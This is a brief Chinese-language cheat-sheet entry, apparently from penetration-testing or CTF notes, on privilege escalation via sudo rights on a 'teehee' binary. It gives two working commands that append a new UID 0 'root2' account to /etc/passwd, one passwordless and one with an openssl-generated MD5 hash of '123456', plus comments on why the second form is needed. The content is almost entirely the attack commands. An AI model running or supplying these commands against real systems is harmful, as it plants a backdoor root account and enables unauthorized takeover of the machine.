**teehee提权**
```bash
echo "root2::0:0:::/bin/bash" | sudo teehee -a /etc/passwd
有的系统强制输入密码无密码直接失败

同一个系统中的不同账号，完全可以各自使用不同的加密算法，因此/etc/passwd中的加密方式不统一，自己选一个加密方式即可
echo "root2:$(openssl passwd -1 123456):0:0::/root:/bin/bash" | sudo teehee -a /etc/passwd
```
